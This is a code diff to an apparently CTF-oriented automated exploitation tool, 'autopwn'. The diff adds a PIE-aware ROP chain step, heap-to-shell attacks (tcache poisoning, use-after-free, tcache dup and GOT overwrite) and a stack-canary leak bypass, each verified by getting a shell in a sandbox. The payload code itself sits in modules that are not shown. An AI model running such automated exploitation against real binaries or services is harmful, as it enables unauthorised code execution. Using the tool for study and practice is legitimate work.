@@ -116,19 +116,25 @@ def autopwn(binary: str, config=None, store=None,
     elif want("ret2win"):
         log("[combo] ret2win: no hay funcion gift -> se omite")
 
-    # combo B: ROP chain (ret2libc / execve)
+    # combo B: ROP chain (ret2libc / execve). On a PIE binary the base must be resolved first, so
+    # use the PIE-aware ROP verifier; otherwise the static/no-PIE ROP builder (with string staging
+    # + SROP). Both verify by getting a real shell in the sandbox.
     if want("rop-chain"):
-      log("[combo] cadena ROP: intentando construir...")
+      log("[combo] cadena ROP: intentando construir..." + (" (PIE)" if is_pie else ""))
       try:
-        from .autopoc import autorop
-        rr = autorop(binary, run=run)
+        if is_pie:
+            from .autopie import autopie_rop
+            rr = autopie_rop(binary, run=run)
+        else:
+            from .autopoc import autorop
+            rr = autorop(binary, run=run)
         verdict = True if rr.get("verified") else (None if rr.get("ok") else False)
         detail = (rr.get("strategy", "") + (" -> SHELL verificada" if rr.get("verified") else
-                  " (construida)" if rr.get("ok") else "")) or rr.get("note", "")
+                  " (construida)" if rr.get("ok") else "")) or rr.get("detail") or rr.get("note", "")
         res.attempts.append(("rop-chain", verdict, detail or rr.get("note", "")))
         res.win_exploit = res.win_exploit or bool(rr.get("verified"))
         log(f"[combo] cadena ROP -> {'SHELL VERIFICADA' if rr.get('verified') else ('construida' if rr.get('ok') else 'no automatica')}")
-        learn(f"rop verified={rr.get('verified')} strategy={rr.get('strategy')} offset={rr.get('offset')}")
+        learn(f"rop verified={rr.get('verified')} strategy={rr.get('strategy') or rr.get('detail')}")
       except Exception as e:
         res.attempts.append(("rop-chain", False, str(e)))
 
@@ -199,6 +205,53 @@ def autopwn(binary: str, config=None, store=None,
                 log("[combo] heap -> no disparada con entradas de prueba")
         except Exception as e:
             res.attempts.append(("heap-corruption", False, str(e)))
+
+    # combo F: heap-to-shell families (menu-driven). Cheap ELF-symbol applicability pre-checks
+    # avoid wasted sandbox runs; each driver verifies by getting a REAL shell (not just a crash).
+    if run:
+        try:
+            from .autoheap import autoheap_shell, _heap_shell_applicable
+            from .autouaf import autouaf_shell, _uaf_applicable
+            from .autotcachedup import autotcachedup_shell, _tcache_dup_applicable
+            from .autowow import autowow_shell, _wow_applicable
+            heap_combos = []
+            if want("heap-shell") and _heap_shell_applicable(binary):
+                heap_combos.append(("heap-shell", autoheap_shell, "tcache poison -> free@GOT=win"))
+            if want("uaf-funcptr") and _uaf_applicable(binary):
+                heap_combos.append(("uaf-funcptr", autouaf_shell, "UAF reuso de chunk -> funcptr=win"))
+            if want("tcache-dup") and _tcache_dup_applicable(binary):
+                heap_combos.append(("tcache-dup", autotcachedup_shell, "tcache dup -> GOT=system"))
+            if want("write-what-where") and _wow_applicable(binary):
+                heap_combos.append(("write-what-where", autowow_shell, "indice sin comprobar -> GOT=win"))
+        except Exception as e:
+            heap_combos = []
+            log(f"[combo] heap-shell families no disponibles: {e}")
+        for name, fn, desc in heap_combos:
+            log(f"[combo] {name}: {desc} (sandbox)...")
+            try:
+                rx = fn(binary)
+                verdict = True if rx.get("verified") else (None if rx.get("ok") else False)
+                res.attempts.append((name, verdict, rx.get("detail") or rx.get("note", "")))
+                res.win_exploit = res.win_exploit or bool(rx.get("verified"))
+                log(f"[combo] {name} -> {'SHELL VERIFICADA' if rx.get('verified') else 'no verificado'}")
+                learn(f"{name} verified={rx.get('verified')} {rx.get('detail','')}")
+            except Exception as e:
+                res.attempts.append((name, False, str(e)))
+
+    # combo G: stack-canary bypass by leak (canary present + a gift win()). autocanary leaks the
+    # canary via a %s echo, then overflows past it to win().
+    if run and want("canary") and str(mit.get("canary", "")).lower() in ("true", "1") and win is not None:
+        log("[combo] canary: fuga del canary + overflow a win (sandbox)...")
+        try:
+            from .autocanary import autocanary
+            rc = autocanary(binary)
+            verdict = True if rc.get("verified") else (None if rc.get("ok") else False)
+            res.attempts.append(("canary-bypass", verdict, rc.get("detail") or rc.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rc.get("verified"))
+            log(f"[combo] canary -> {'SHELL VERIFICADA' if rc.get('verified') else 'no verificado'}")
+            learn(f"canary-bypass verified={rc.get('verified')} {rc.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("canary-bypass", False, str(e)))
 
     log("[fin] combinaciones probadas: " + ", ".join(a[0] for a in res.attempts))
     return res
